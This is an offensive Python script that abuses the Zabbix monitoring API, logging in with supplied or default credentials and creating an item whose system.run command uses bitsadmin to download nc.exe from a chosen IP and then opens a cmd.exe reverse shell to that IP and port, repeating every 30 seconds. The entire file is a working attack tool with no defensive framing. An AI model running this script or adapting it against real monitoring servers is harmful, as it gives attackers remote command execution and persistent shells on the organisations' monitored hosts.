#!/usr/bin/env python3
"""
Usage: zabbix_bitsadmin_nc_download.py --api http://IP/zabbix/api_jsonrpc.php --user Admin --password zabbix --host host1 --download-ip 192.168.56.100 --connect-ip 192.168.56.100 --connect-port 5555
"""
import argparse
import sys

from pyzabbix import ZabbixAPI, ZabbixAPIException


parser = argparse.ArgumentParser(description="Create a Zabbix item that downloads and runs nc.exe.")
parser.add_argument("--api", required=True, help="Zabbix API URL, e.g. http://IP/zabbix/api_jsonrpc.php")
parser.add_argument("--user", required=True, help="Zabbix username")
parser.add_argument("--password", required=True, help="Zabbix password")
parser.add_argument("--host", required=True, help="Zabbix host name")
parser.add_argument("--download-ip", required=True, help="IP where nc.exe is hosted")
parser.add_argument("--connect-ip", required=True, help="IP to connect back to")
parser.add_argument("--connect-port", required=True, help="Port to connect back to")
args = parser.parse_args()

api_address = args.api
user = args.user
password = args.password
host_name = args.host
# hostid=raw_input("enter hostid: \n")

zapi = ZabbixAPI(api_address) # user='Admin', password='zabbix')

# Login to the Zabbix API
zapi.login(user, password)

# host_name = 'Zabbix_server'

# host_name = "windows host"

hosts = zapi.host.get(filter={"host": host_name}, selectInterfaces=["interfaceid"])
if hosts:
    host_id = hosts[0]["hostid"]
    print("Found host id {0}".format(host_id))

    try:
        item = zapi.item.create(
            hostid=host_id,
            name="netcat_create_reverse_shell",
            key_=(
                'system.run["bitsadmin.exe /transfer /download http://{download_ip}/nc.exe '
                'C:\\Users\\Public\\nc.exe && C:\\Users\\Public\\nc.exe {connect_ip} '
                '{connect_port} -e cmd.exe"]'
            ).format(
                download_ip=args.download_ip,
                connect_ip=args.connect_ip,
                connect_port=args.connect_port,
            ),
            type=0,
            value_type=4,
            interfaceid=hosts[0]["interfaces"][0]["interfaceid"],
            delay=30,
        )
    except ZabbixAPIException as e:
        print(e)
        sys.exit()
    print("Added item with itemid {0} to host: {1}".format(item["itemids"][0], host_name))
else:
    print("No hosts found")
